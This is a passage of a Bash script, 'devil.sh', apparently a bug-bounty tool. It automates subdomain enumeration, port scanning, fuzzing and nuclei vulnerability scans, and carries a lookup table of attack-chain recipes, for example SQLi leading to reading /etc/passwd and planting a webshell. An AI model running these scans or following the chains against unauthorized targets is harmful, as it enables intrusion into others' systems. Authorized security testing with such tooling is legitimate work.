#!/usr/bin/env bash
# ============================================================
#  ROXX'S SLAVE v888 — ABYSS OMEGA
#  devil.sh — The Main Hunt Engine
#  "From the depths, we harvest."
# ============================================================

# ─── Strict-ish mode (no set -e; we handle errors softly) ───
set -uo pipefail
IFS=$'\n\t'

# ─── Version ─────────────────────────────────────────────────
DEVIL_VERSION="888.0-ABYSS-OMEGA"
SCRIPT_PATH="$(realpath "${BASH_SOURCE[0]}" 2>/dev/null || echo "$0")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"

# ─── Colour Palette ──────────────────────────────────────────
RED='\033[0;31m'
BRED='\033[1;31m'
GREEN='\033[0;32m'
BGREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BBLUE='\033[1;34m'
MAGENTA='\033[0;35m'
BMAGENTA='\033[1;35m'
CYAN='\033[0;36m'
BCYAN='\033[1;36m'
WHITE='\033[1;37m'
DIM='\033[2m'
RESET='\033[0m'
BLINK='\033[5m'

# ─── Global Paths ─────────────────────────────────────────────
FINDINGS_BASE="${HOME}/findings"
WORDLIST_DIR="${HOME}/wordlists"
CONFIG_DIR="${HOME}/.config/devil"
TARGETS_FILE="${CONFIG_DIR}/targets.txt"
SCOPE_CACHE="${CONFIG_DIR}/scope_cache"
LOG_DIR="${CONFIG_DIR}/logs"
UPDATE_URL="https://raw.githubusercontent.com/roxxs-slave/devil/main/devil.sh"
INTERACTSH_SERVER="${INTERACTSH_SERVER:-oast.pro}"
RATE_LIMIT_THREADS="${RATE_LIMIT_THREADS:-50}"
NUCLEI_SEVERITY="${NUCLEI_SEVERITY:-critical,high,medium}"
HTTP_TIMEOUT="${HTTP_TIMEOUT:-15}"
MAX_PARALLEL="${MAX_PARALLEL:-10}"
DASHBOARD_PORT="${DASHBOARD_PORT:-1337}"

# ─── Tool registry (name → install-hint) ─────────────────────
declare -A TOOLS=(
  [subfinder]="go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
  [amass]="go install -v github.com/owasp-amass/amass/v4/...@master"
  [assetfinder]="go install -v github.com/tomnomnom/assetfinder@latest"
  [chaos]="go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest"
  [dnsx]="go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
  [shuffledns]="go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
  [httpx]="go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
  [naabu]="go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
  [wafw00f]="pip3 install wafw00f"
  [gowitness]="go install -v github.com/sensepost/gowitness@latest"
  [waybackurls]="go install -v github.com/tomnomnom/waybackurls@latest"
  [gau]="go install -v github.com/lc/gau/v2/cmd/gau@latest"
  [katana]="go install -v github.com/projectdiscovery/katana/cmd/katana@latest"
  [getJS]="go install -v github.com/003random/getJS@latest"
  [LinkFinder]="pip3 install linkfinder 2>/dev/null || git clone https://github.com/GerbenJavado/LinkFinder.git /opt/LinkFinder"
  [arjun]="pip3 install arjun"
  [nuclei]="go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
  [dalfox]="go install -v github.com/hahwul/dalfox/v2@latest"
  [sqlmap]="apt-get install -y sqlmap 2>/dev/null || pip3 install sqlmap"
  [gf]="go install -v github.com/tomnomnom/gf@latest"
  [trufflehog]="pip3 install trufflehog 2>/dev/null || go install -v github.com/trufflesecurity/trufflehog/v3@latest"
  [gitleaks]="go install -v github.com/zricethezav/gitleaks/v8@latest"
  [subzy]="go install -v github.com/PentestPad/subzy@latest"
  [subjack]="go install -v github.com/haccer/subjack@latest"
  [interactsh-client]="go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
  [ffuf]="go install -v github.com/ffuf/ffuf/v2@latest"
  [jq]="apt-get install -y jq 2>/dev/null || brew install jq"
  [curl]="apt-get install -y curl"
  [wget]="apt-get install -y wget"
  [python3]="apt-get install -y python3"
)

# ─── Helpers ──────────────────────────────────────────────────

log_raw()   { printf "%b\n" "$*"; }
log_info()  { printf "${CYAN}[*]${RESET} %b\n" "$*"; }
log_ok()    { printf "${BGREEN}[+]${RESET} %b\n" "$*"; }
log_warn()  { printf "${YELLOW}[!]${RESET} %b\n" "$*"; }
log_err()   { printf "${BRED}[✗]${RESET} %b\n" "$*" >&2; }
log_phase() {
  local n="$1" total="$2" name="$3"
  printf "\n${BMAGENTA}╔══════════════════════════════════════════════════════════╗${RESET}\n"
  printf "${BMAGENTA}║${RESET} ${BBLUE}[PHASE %02d/%02d]${RESET} ${WHITE}%-46s${RESET} ${BMAGENTA}║${RESET}\n" "$n" "$total" "$name"
  printf "${BMAGENTA}╚══════════════════════════════════════════════════════════╝${RESET}\n\n"
}

ts() { date '+%Y-%m-%d %H:%M:%S'; }
run_with_timeout() {
  local secs="$1"; shift
  timeout "$secs" "$@" 2>/dev/null || true
}

tool_exists() { command -v "$1" &>/dev/null; }

ensure_tool() {
  local tool="$1"
  if ! tool_exists "$tool"; then
    log_warn "Tool '${tool}' not found. Attempting self-heal install…"
    local hint="${TOOLS[$tool]:-}"
    if [[ -n "$hint" ]]; then
      eval "$hint" 2>/dev/null || true
      if tool_exists "$tool"; then
        log_ok "'${tool}' installed successfully."
      else
        log_err "Could not install '${tool}'. Skipping dependent step."
        return 1
      fi
    else
      log_err "No install hint for '${tool}'. Skipping."
      return 1
    fi
  fi
  return 0
}

save_output() {
  local file="$1"; shift
  mkdir -p "$(dirname "$file")"
  "$@" 2>/dev/null | tee -a "$file" || true
}

append_finding() {
  local findings_file="$1" severity="$2" type="$3" detail="$4"
  mkdir -p "$(dirname "$findings_file")"
  printf "[%s] [%s] [%s] %s\n" "$(ts)" "$severity" "$type" "$detail" >> "$findings_file"
}

count_lines() { wc -l < "${1:-/dev/null}" 2>/dev/null || echo 0; }

# ─── Banner ───────────────────────────────────────────────────

show_banner() {
  clear 2>/dev/null || true
  printf "${BRED}"
  cat << 'BANNER'
 ██████╗ ███████╗██╗   ██╗██╗██╗
 ██╔══██╗██╔════╝██║   ██║██║██║
 ██║  ██║█████╗  ██║   ██║██║██║
 ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║
 ██████╔╝███████╗ ╚████╔╝ ██║███████╗
 ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝
BANNER
  printf "${RESET}"
  printf "${BMAGENTA}"
  cat << 'BANNER2'
 ███████╗██╗      █████╗ ██╗   ██╗███████╗
 ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝
 ███████╗██║     ███████║██║   ██║█████╗
 ╚════██║██║     ██╔══██║╚██╗ ██╔╝██╔══╝
 ███████║███████╗██║  ██║ ╚████╔╝ ███████╗
 ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝
BANNER2
  printf "${RESET}"
  printf "\n${DIM}  v%-20s  ABYSS OMEGA Edition${RESET}\n" "$DEVIL_VERSION"
  printf "${DIM}  \"From the depths, we harvest.\"${RESET}\n"
  printf "${RED}  ──────────────────────────────────────────────────${RESET}\n\n"
}

# ─── Init dirs ────────────────────────────────────────────────

init_dirs() {
  mkdir -p "$FINDINGS_BASE" "$CONFIG_DIR" "$LOG_DIR" "$SCOPE_CACHE" "$WORDLIST_DIR"
  touch "$TARGETS_FILE" 2>/dev/null || true
  # Ensure nuclei templates exist
  if tool_exists nuclei; then
    nuclei -update-templates -silent 2>/dev/null || true
  fi
  # Ensure GF patterns
  if tool_exists gf && [[ ! -d "${HOME}/.gf" ]]; then
    mkdir -p "${HOME}/.gf"
    git clone --quiet https://github.com/1ndianl33t/Gf-Patterns "${HOME}/.gf" 2>/dev/null || true
  fi
  # Default wordlist
  if [[ ! -f "${WORDLIST_DIR}/subdomains.txt" ]]; then
    log_info "Fetching default subdomain wordlist…"
    wget -q -O "${WORDLIST_DIR}/subdomains.txt" \
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt" 2>/dev/null || true
  fi
  if [[ ! -f "${WORDLIST_DIR}/dns-resolvers.txt" ]]; then
    wget -q -O "${WORDLIST_DIR}/dns-resolvers.txt" \
      "https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt" 2>/dev/null || true
  fi
}

# ══════════════════════════════════════════════════════════════
#  SUBCOMMANDS
# ══════════════════════════════════════════════════════════════

# ─── devil update ─────────────────────────────────────────────
cmd_update() {
  log_info "Checking for devil.sh updates…"
  local tmp
  tmp="$(mktemp /tmp/devil_update_XXXXXX.sh)" || { log_err "mktemp failed"; return 1; }
  if curl -fsSL "$UPDATE_URL" -o "$tmp" 2>/dev/null; then
    if bash -n "$tmp" 2>/dev/null; then
      cp "$tmp" "$SCRIPT_PATH" && chmod +x "$SCRIPT_PATH"
      log_ok "devil.sh updated to latest version."
    else
      log_err "Downloaded script failed syntax check. Aborting update."
    fi
  else
    log_warn "Could not reach update URL. Trying nuclei/tool updates instead."
  fi
  rm -f "$tmp"
  # Update all Go tools
  log_info "Updating Go-based tools…"
  local gotools=(
    "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    "github.com/projectdiscovery/katana/cmd/katana@latest"
    "github.com/hahwul/dalfox/v2@latest"
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/PentestPad/subzy@latest"
  )
  for pkg in "${gotools[@]}"; do
    log_info "Updating ${pkg%%@*}…"
    go install -v "$pkg" 2>/dev/null || true
  done
  if tool_exists nuclei; then
    nuclei -update-templates -silent 2>/dev/null || true
    log_ok "Nuclei templates updated."
  fi
  log_ok "Update complete."
}

# ─── devil heal ───────────────────────────────────────────────
cmd_heal() {
  log_info "Running ROXX-HEAL — verifying and repairing tool installations…"
  local missing=() repaired=() failed=()
  for tool in "${!TOOLS[@]}"; do
    if ! tool_exists "$tool"; then
      missing+=("$tool")
    fi
  done
  if [[ ${#missing[@]} -eq 0 ]]; then
    log_ok "All registered tools are present."
    return 0
  fi
  log_warn "Missing tools: ${missing[*]}"
  for tool in "${missing[@]}"; do
    log_info "Installing: $tool"
    local hint="${TOOLS[$tool]}"
    eval "$hint" 2>/dev/null && repaired+=("$tool") || failed+=("$tool")
  done
  [[ ${#repaired[@]} -gt 0 ]] && log_ok "Repaired: ${repaired[*]}"
  [[ ${#failed[@]} -gt 0 ]]   && log_err "Failed:   ${failed[*]}"
}

# ─── devil status ─────────────────────────────────────────────
cmd_status() {
  printf "\n${WHITE}%-20s %-10s %s${RESET}\n" "TOOL" "STATUS" "VERSION"
  printf "%s\n" "──────────────────────────────────────────────────"
  for tool in subfinder amass assetfinder dnsx shuffledns httpx naabu wafw00f \
              gowitness waybackurls gau katana getJS arjun nuclei dalfox sqlmap \
              gf trufflehog gitleaks subzy subjack interactsh-client ffuf jq curl wget; do
    local status ver color
    if tool_exists "$tool"; then
      status="FOUND"
      color="$BGREEN"
      ver="$(${tool} --version 2>&1 | head -1 | tr -d '\n' | cut -c1-30 || echo '?')"
    else
      status="MISSING"
      color="$BRED"
      ver="—"
    fi
    printf "${color}%-20s %-10s${RESET} ${DIM}%s${RESET}\n" "$tool" "$status" "$ver"
  done
  printf "\n"
}

# ─── devil dashboard ──────────────────────────────────────────
cmd_dashboard() {
  log_info "Starting ROXX DEVIL Dashboard on :${DASHBOARD_PORT}…"
  # Lightweight Python HTTP server over ~/findings with a simple HTML index
  local dash_dir
  dash_dir="$(mktemp -d /tmp/devil_dash_XXXXXX)" || { log_err "mktemp failed"; return 1; }
  cat > "${dash_dir}/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="30">
<title>ROXX'S SLAVE — DEVIL Dashboard</title>
<style>
  body{background:#0a0a0a;color:#e0e0e0;font-family:'Courier New',monospace;margin:0;padding:20px;}
  h1{color:#ff2222;text-shadow:0 0 10px #ff2222;}
  h2{color:#cc44ff;}
  table{border-collapse:collapse;width:100%;margin-bottom:20px;}
  th{background:#1a0033;color:#cc44ff;padding:8px;text-align:left;}
  td{padding:6px 8px;border-bottom:1px solid #222;}
  tr:hover{background:#111;}
  .crit{color:#ff2222;} .high{color:#ff8800;} .med{color:#ffdd00;}
  .ok{color:#22ff88;} .info{color:#44aaff;}
  pre{background:#111;padding:10px;overflow:auto;border-left:3px solid #cc44ff;}
  .badge{border-radius:4px;padding:2px 6px;font-size:.8em;}
</style>
</head>
<body>
<h1>&#x1F608; ROXX'S SLAVE v888 — ABYSS OMEGA</h1>
<h2>Hunt Dashboard</h2>
<p class="info">Auto-refreshes every 30 seconds | Findings directory served below</p>
<h2>Active Findings</h2>
<pre id="findings">Loading…</pre>
<script>
fetch('/findings.txt').then(r=>r.text()).then(t=>{
  document.getElementById('findings').textContent=t||'No findings yet.';
}).catch(()=>{document.getElementById('findings').textContent='No findings yet.';});
</script>
</body>
</html>
HTMLEOF

  # Generate a simple findings.txt aggregation
  find "$FINDINGS_BASE" -name "findings.txt" -exec cat {} \; > "${dash_dir}/findings.txt" 2>/dev/null || true
  ln -sfn "$FINDINGS_BASE" "${dash_dir}/data" 2>/dev/null || true

  log_ok "Dashboard at http://0.0.0.0:${DASHBOARD_PORT}/"
  log_info "Press Ctrl-C to stop."
  cd "$dash_dir" && python3 -m http.server "$DASHBOARD_PORT" 2>/dev/null || \
    python  -m SimpleHTTPServer "$DASHBOARD_PORT" 2>/dev/null || true
}

# ─── devil targets ────────────────────────────────────────────
cmd_targets() {
  local action="${1:-list}"
  case "$action" in
    list)
      if [[ -s "$TARGETS_FILE" ]]; then
        log_info "Saved targets:"
        cat -n "$TARGETS_FILE"
      else
        log_warn "No targets saved yet. Use: devil targets add <target>"
      fi
      ;;
    add)
      local t="${2:-}"
      [[ -z "$t" ]] && { log_err "Usage: devil targets add <target>"; return 1; }
      echo "$t" >> "$TARGETS_FILE"
      log_ok "Added: $t"
      ;;
    remove)
      local t="${2:-}"
      [[ -z "$t" ]] && { log_err "Usage: devil targets remove <target>"; return 1; }
      sed -i "\|^${t}$|d" "$TARGETS_FILE" 2>/dev/null || true
      log_ok "Removed: $t"
      ;;
    clear)
      > "$TARGETS_FILE"
      log_ok "Targets list cleared."
      ;;
    *)
      log_err "Unknown targets action: $action"
      log_info "Usage: devil targets [list|add|remove|clear]"
      ;;
  esac
}

# ─── devil report ─────────────────────────────────────────────
cmd_report() {
  local findings_file="${1:-}"
  [[ -z "$findings_file" || ! -f "$findings_file" ]] && {
    log_err "Usage: devil report <findings_file>"
    return 1
  }
  local target
  target="$(basename "$(dirname "$findings_file")")"
  local out_dir="${FINDINGS_BASE}/${target}/reports"
  mkdir -p "$out_dir"
  local report_md="${out_dir}/report_$(date +%Y%m%d_%H%M%S).md"

  log_info "Generating H1/Bugcrowd report from: $findings_file"

  {
    printf "# Bug Report — %s\n\n" "$target"
    printf "**Generated:** %s\n\n" "$(ts)"
    printf "**Tool:** ROXX'S SLAVE v%s — ABYSS OMEGA\n\n" "$DEVIL_VERSION"
    printf "---\n\n"

    # Group by severity
    for sev in CRITICAL HIGH MEDIUM LOW INFO; do
      local lines
      lines="$(grep -i "\[$sev\]" "$findings_file" 2>/dev/null || true)"
      [[ -z "$lines" ]] && continue
      printf "## %s Findings\n\n" "$sev"
      while IFS= read -r line; do
        local type detail
        type="$(echo "$line" | grep -oP '\[\K[^\]]+(?=\] [^\[])' | tail -1)"
        detail="$(echo "$line" | sed 's/^[^]]*\][^]]*\][^]]*\] //')"
        printf "### %s\n\n" "$type"
        printf "**Detail:** \`%s\`\n\n" "$detail"
        printf "**Steps to Reproduce:**\n\n"
        printf "1. Navigate to the affected endpoint.\n"
        printf "2. Apply the identified payload/vector.\n"
        printf "3. Observe the vulnerability.\n\n"
        printf "**Impact:** To be assessed based on business context.\n\n"
        printf "**Remediation:** Refer to OWASP guidelines for %s.\n\n---\n\n" "$type"
      done <<< "$lines"
    done

    printf "## Raw Findings Log\n\n\`\`\`\n"
    cat "$findings_file"
    printf "\`\`\`\n"
  } > "$report_md"

  log_ok "Report generated: $report_md"
}

# ─── devil chain ──────────────────────────────────────────────
cmd_chain() {
  local v1="${1:-}" v2="${2:-}"
  [[ -z "$v1" || -z "$v2" ]] && { log_err "Usage: devil chain <vuln1> <vuln2>"; return 1; }
  log_info "Analysing exploit chain: ${v1} → ${v2}"

  declare -A CHAIN_DB=(
    ["SSRF+RCE"]="SSRF → Internal metadata → Cloud credential leak → RCE via AWS CLI"
    ["XSS+CSRF"]="Stored XSS → steal CSRF token → perform state-changing CSRF action"
    ["IDOR+AUTH"]="IDOR on user ID → access admin object → auth bypass → privilege escalation"
    ["SQLI+RCE"]="SQLi UNION → read /etc/passwd → INTO OUTFILE webshell → RCE"
    ["OPENREDIRECT+PHISHING"]="Open Redirect → craft phishing URL on trusted domain → steal creds"
    ["SECRETLEAK+TAKEOVER"]="JS secret leak → API key → cloud resource access → account takeover"
    ["SUBDTAKEOVER+PHISHING"]="Subdomain takeover → serve phishing page on legit subdomain"
    ["SSRF+SSRF"]="SSRF chained via internal proxy → pivot deeper into internal network"
    ["XSS+SSRF"]="XSS → force victim browser to trigger SSRF → internal network scan"
    ["IDOR+SQLI"]="IDOR leaks DB identifiers → SQLi on exposed param → full DB dump"
    ["AUTHBYPASS+IDOR"]="Auth bypass → access unauth endpoints → IDOR on user data"
    ["RATELIMIT+BRUTEFORCE"]="No rate-limit on login → brute-force credentials → account takeover"
  )

  local key="${v1^^}+${v2^^}"
  local result="${CHAIN_DB[$key]:-}"

  if [[ -n "$result" ]]; then
    printf "\n${BGREEN}[CHAIN FOUND]${RESET} %s\n\n" "$result"
  else
    # Reverse lookup
    local rkey="${v2^^}+${v1^^}"
    result="${CHAIN_DB[$rkey]:-}"
    if [[ -n "$result" ]]; then
      printf "\n${BGREEN}[CHAIN FOUND (reversed)]${RESET} %s\n\n" "$result"
    else
      printf "\n${YELLOW}[?] No predefined chain for ${v1} + ${v2}.${RESET}\n"
      printf "${DIM}Possible synergies to manually explore:\n"
      printf "  - Can %s expose internal endpoints reachable via %s?\n" "$v1" "$v2"
      printf "  - Can %s be used to exfiltrate data found via %s?\n" "$v2" "$v1"
      printf "  - Does %s bypass protections that normally prevent %s?\n" "$v1" "$v2"
      printf "${RESET}\n"
    fi
  fi
}

# ─── devil scope ──────────────────────────────────────────────
cmd_scope() {
  local program="${1:-}"
  [[ -z "$program" ]] && { log_err "Usage: devil scope <program-handle>"; return 1; }
  local cache_file="${SCOPE_CACHE}/${program}.json"
  log_info "Fetching scope for program: $program"

  # Try HackerOne public API
  local h1_url="https://api.hackerone.com/v1/hackers/programs/${program}"
  if curl -fsSL --max-time 15 "$h1_url" -o "$cache_file.tmp" 2>/dev/null; then
    if [[ -s "$cache_file.tmp" ]]; then
      mv "$cache_file.tmp" "$cache_file"
      log_ok "Scope cached: $cache_file"
      if tool_exists jq; then
        jq -r '.relationships.structured_scopes.data[]? | "\(.attributes.asset_type) | \(.attributes.asset_identifier) | eligible=\(.attributes.eligible_for_bounty)"' \
          "$cache_file" 2>/dev/null || cat "$cache_file"
      else
        cat "$cache_file"
      fi
      return 0
    fi
  fi
  rm -f "$cache_file.tmp"

  # Try Bugcrowd
  local bc_url="https://bugcrowd.com/${program}/target_groups"
  log_warn "H1 API failed. Fetching Bugcrowd scope for: $program"
  curl -fsSL --max-time 15 \
    -H "Accept: application/json" \
    "$bc_url" 2>/dev/null | tee "$cache_file" | \
    (tool_exists jq && jq -r '.groups[]?.targets[]?.name // empty' 2>/dev/null || cat) || \
    log_err "Could not fetch scope. Program may be private or handle incorrect."
}

# ─── devil recon (standalone) ────────────────────────────────
cmd_recon() {
  local target="${1:-}"
  [[ -z "$target" ]] && { log_err "Usage: devil recon <target>"; return 1; }
  local out_dir="${FINDINGS_BASE}/${target}/recon"
  mkdir -p "$out_dir"
  log_info "Standalone RECON on: $target → $out_dir"

  _phase_passive_recon "$target" "$out_dir"
  _phase_dns_resolution "$target" "$out_dir"
  _phase_http_probe "$target" "$out_dir"

  log_ok "Recon complete. Results: $out_dir"
}

# ─── devil fuzz (standalone) ─────────────────────────────────
cmd_fuzz() {
  local url="${1:-}"
  [[ -z "$url" ]] && { log_err "Usage: devil fuzz <url>"; return 1; }
  local target
  target="$(echo "$url" | sed 's|https\?://||;s|/.*||')"
  local out_dir="${FINDINGS_BASE}/${target}/fuzz"
  mkdir -p "$out_dir"
  log_info "Standalone FUZZ on: $url"

  ensure_tool ffuf || return 1
  local wordlist="${WORDLIST_DIR}/subdomains.txt"
  [[ ! -f "$wordlist" ]] && wordlist="/usr/share/wordlists/dirb/common.txt"
  [[ ! -f "$wordlist" ]] && { log_err "No wordlist found. Run: devil heal"; return 1; }

  log_info "ffuf directory brute-force…"
  run_with_timeout 300 ffuf \
    -u "${url}/FUZZ" \
    -w "$wordlist" \
    -t 50 \
    -mc 200,201,204,301,302,403,405 \
    -o "${out_dir}/ffuf_dirs.json" \
    -of json \
    -s 2>/dev/null || true

  log_info "ffuf parameter fuzzing…"
  run_with_timeout 180 ffuf \
    -u "${url}?FUZZ=devil" \
    -w "$wordlist" \
    -t 30 \
    -mc 200,201,204,301,302 \
    -fs 0 \
    -s 2>/dev/null | tee "${out_dir}/ffuf_params.txt" || true

  log_ok "Fuzz results: $out_dir"
}

# ─── devil nuclei (standalone) ───────────────────────────────
cmd_nuclei_scan() {
  local target="${1:-}"
  [[ -z "$target" ]] && { log_err "Usage: devil nuclei <target>"; return 1; }
  ensure_tool nuclei || return 1
  local out_dir="${FINDINGS_BASE}/${target}/nuclei"
  mkdir -p "$out_dir"
  log_info "Full Nuclei scan on: $target"

  nuclei -u "$target" \
    -severity critical,high,medium,low \
    -tags cve,misconfig,exposure,rce,sqli,xss,ssrf,takeover \
    -o "${out_dir}/nuclei_full.txt" \
    -stats \
    -bulk-size 25 \
    -concurrency 10 \
    -rate-limit 150 \
    2>/dev/null || true

  local count
  count="$(count_lines "${out_dir}/nuclei_full.txt")"
  log_ok "Nuclei found ${count} findings → ${out_dir}/nuclei_full.txt"
}

# ══════════════════════════════════════════════════════════════
#  HUNT PHASE FUNCTIONS
# ══════════════════════════════════════════════════════════════

_phase_passive_recon() {
  local target="$1" base="$2"
  local out="${base}/01_passive_recon"
  mkdir -p "$out"
  log_phase 1 25 "PASSIVE RECON"

  local pids=()

  # subfinder
  if ensure_tool subfinder 2>/dev/null; then
    log_info "subfinder…"
    run_with_timeout 300 subfinder -d "$target" -silent -o "${out}/subfinder.txt" &
    pids+=($!)
  fi

  # amass (passive only for speed)
  if ensure_tool amass 2>/dev/null; then
    log_info "amass (passive)…"
    run_with_timeout 600 amass enum -passive -d "$target" -o "${out}/amass.txt" &
    pids+=($!)
  fi

  # assetfinder
  if ensure_tool assetfinder 2>/dev/null; then
    log_info "assetfinder…"
    run_with_timeout 120 assetfinder --subs-only "$target" > "${out}/assetfinder.txt" &
    pids+=($!)
  fi

  # crt.sh
  log_info "crt.sh API…"
  {
    curl -fsSL --max-time 30 \
      "https://crt.sh/?q=%.${target}&output=json" 2>/dev/null | \
      (tool_exists jq && \
        jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u \
        || grep -oP '"name_value":"[^"]*"' | sed 's/"name_value":"//;s/"//' | sed 's/\*\.//' | sort -u) \
      > "${out}/crtsh.txt"
  } &
  pids+=($!)

  # hackertarget
  log_info "hackertarget API…"
  {
    curl -fsSL --max-time 30 \
      "https://api.hackertarget.com/hostsearch/?q=${target}" 2>/dev/null | \
      cut -d',' -f1 | sort -u > "${out}/hackertarget.txt"
  } &
  pids+=($!)

  # rapiddns
  log_info "rapiddns API…"
  {
    curl -fsSL --max-time 30 \
      "https://rapiddns.io/subdomain/${target}?full=1#result" 2>/dev/null | \
      grep -oP "(?<=<td>)[a-zA-Z0-9._-]+\.${target}(?=</td>)" | sort -u \
      > "${out}/rapiddns.txt"
  } &
  pids+=($!)

  # chaos
  if ensure_tool chaos 2>/dev/null; then
    log_info "chaos…"
    run_with_timeout 120 chaos -d "$target" -silent -o "${out}/chaos.txt" &
    pids+=($!)
  fi

  # Wait for all passive recon jobs
  for pid in "${pids[@]}"; do
    wait "$pid" 2>/dev/null || true
  done

  # Merge and deduplicate
  cat "${out}"/*.txt 2>/dev/null | \
    grep -E "^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$" | \
    sort -u > "${base}/all_subdomains_raw.txt"

  local count
  count="$(count_lines "${base}/all_subdomains_raw.txt")"
  log_ok "Phase 1 complete — ${count} unique subdomains discovered."
}

_phase_dns_resolution() {
  local target="$1" base="$2"
  local out="${base}/02_dns"
  mkdir -p "$out"
  log_phase 2 25 "DNS RESOLUTION"

  local input="${base}/all_subdomains_raw.txt"
  [[ ! -s "$input" ]] && { log_warn "No subdomains to resolve."; return; }

  local resolvers="${WORDLIST_DIR}/dns-resolvers.txt"

  # dnsx
  if ensure_tool dnsx 2>/dev/null; then
    log_info "dnsx resolving ${count_lines "$input"} subdomains…"
    run_with_timeout 600 dnsx \
      -l "$input" \
      -r "$resolvers" \
      -resp \
      -a -aaaa -cname -mx -ns \
      -o "${out}/dnsx_resolved.txt" \
      -silent 2>/dev/null || true
  fi

  # shuffledns for brute-forcing extra subs
  if ensure_tool shuffledns 2>/dev/null && [[ -f "${WORDLIST_DIR}/subdomains.txt" ]]; then
    log_info "shuffledns brute-force…"
    run_with_timeout 600 shuffledns \
      -d "$target" \
      -w "${WORDLIST_DIR}/subdomains.txt" \
      -r "$resolvers" \
      -o "${out}/shuffledns_brute.txt" \
      -silent 2>/dev/null || true
  fi

  # Combine resolved
  cat "${out}"/*.txt 2>/dev/null | \
    grep -oP "^[^\s]+" | sort -u > "${base}/all_subdomains_resolved.txt"

  local count
  count="$(count_lines "${base}/all_subdomains_resolved.txt")"
  log_ok "Phase 2 complete — ${count} subdomains resolved."
}

_phase_http_probe() {
  local target="$1" base="$2"
  local out="${base}/03_http"
  mkdir -p "$out"
  log_phase 3 25 "HTTP PROBING"

  local input="${base}/all_subdomains_resolved.txt"
  [[ ! -s "$input" ]] && input="${base}/all_subdomains_raw.txt"
  [[ ! -s "$input" ]] && { log_warn "No hosts to probe."; return; }

  ensure_tool httpx 2>/dev/null || { log_warn "httpx not found. Skipping."; return; }

  run_with_timeout 600 httpx \
    -l "$input" \
    -title \
    -tech-detect \
    -status-code \
    -content-length \
    -follow-redirects \
    -threads 50 \
    -timeout "$HTTP_TIMEOUT" \
    -o "${out}/httpx_live.txt" \
    -json \
    -cdn \
    -silent 2>/dev/null || true

  # Extract just the live URLs
  grep -oP 'https?://[^\s"]+' "${out}/httpx_live.txt" 2>/dev/null | sort -u > "${base}/live_hosts.txt" || true

  # Also extract IPs for port scanning
  grep -oP '\d+\.\d+\.\d+\.\d+' "${out}/httpx_live.txt" 2>/dev/null | sort -u > "${base}/live_ips.txt" || true

  local count
  count="$(count_lines "${base}/live_hosts.txt")"
  log_ok "Phase 3 complete — ${count} live HTTP hosts discovered."
}

_phase_port_scan() {
  local target="$1" base="$2"
  local out="${base}/04_ports"
  mkdir -p "$out"
  log_phase 4 25 "PORT SCANNING"

  local ip_input="${base}/live_ips.txt"
  if [[ ! -s "$ip_input" ]]; then
    # fallback: resolve main target
    echo "$target" > "$ip_input"
  fi

  ensure_tool naabu 2>/dev/null || { log_warn "naabu not found. Skipping port scan."; return; }

  log_info "naabu scanning top-1000 ports…"
  run_with_timeout 900 naabu \
    -l "$ip_input" \
    -top-ports 1000 \
    -rate 1000 \
    -silent \
    -o "${out}/naabu_ports.txt" 2>/dev/null || true

  local count
  count="$(count_lines "${out}/naabu_ports.txt")"
  log_ok "Phase 4 complete — ${count} open ports discovered."
}

_phase_waf_detection() {
  local target="$1" base="$2"
  local out="${base}/05_waf"
  mkdir -p "$out"
  log_phase 5 25 "WAF DETECTION"

  local input="${base}/live_hosts.txt"
  [[ ! -s "$input" ]] && { log_warn "No live hosts. Skipping WAF detection."; return; }

  ensure_tool wafw00f 2>/dev/null || { log_warn "wafw00f not found. Skipping."; return; }

  while IFS= read -r host; do
    [[ -z "$host" ]] && continue
    log_info "WAF check: $host"
    run_with_timeout 30 wafw00f "$host" 2>/dev/null | \
      tee -a "${out}/waf_results.txt" | grep -i "is behind" | \
      while IFS= read -r line; do
        append_finding "${base}/findings.txt" "INFO" "WAF" "$line"
      done
    sleep 0.5
  done < "$input"

  log_ok "Phase 5 complete. WAF results: ${out}/waf_results.txt"
}

_phase_screenshot() {
  local target="$1" base="$2"
  local out="${base}/06_screenshots"
  mkdir -p "$out"
  log_phase 6 25 "SCREENSHOT"

  local input="${base}/live_hosts.txt"
  [[ ! -s "$input" ]] && { log_warn "No live hosts. Skipping screenshots."; return; }

  if ensure_tool gowitness 2>/dev/null; then
    log_info "gowitness screenshot sweep…"
    run_with_timeout 600 gowitness file \
      -f "$input" \
      --screenshot-path "$out" \
      --threads 5 \
      --timeout 15 \
      --disable-db 2>/dev/null || true
  elif ensure_tool nuclei 2>/dev/null; then
    log_info "nuclei headless screenshot fallback…"
    run_with_timeout 600 nuclei \
      -l "$input" \
      -t headless/screenshot.yaml \
      -o "${out}/nuclei_screenshot.txt" \
      -silent 2>/dev/null || true
  else
    log_warn "No screenshot tool available. Skipping."
    return
  fi

  local count
  count="$(find "$out" -name "*.png" 2>/dev/null | wc -l || echo 0)"
  log_ok "Phase 6 complete — ${count} screenshots captured."
}

_phase_wayback_mining() {
  local target="$1" base="$2"
